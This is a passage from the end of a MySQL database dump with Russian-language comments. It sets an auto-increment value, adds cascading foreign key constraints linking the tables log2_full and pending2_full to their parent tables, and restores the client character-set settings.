  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=55;

--
-- Ограничения внешнего ключа сохраненных таблиц
--

--
-- Ограничения внешнего ключа таблицы `log2_full`
--
ALTER TABLE `log2_full`
  ADD CONSTRAINT `log2_full_ibfk_1` FOREIGN KEY (`key`) REFERENCES `log2` (`key`) ON DELETE CASCADE;

--
-- Ограничения внешнего ключа таблицы `pending2_full`
--
ALTER TABLE `pending2_full`
  ADD CONSTRAINT `pending2_full_ibfk_1` FOREIGN KEY (`key`) REFERENCES `pending2` (`key`) ON DELETE CASCADE;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
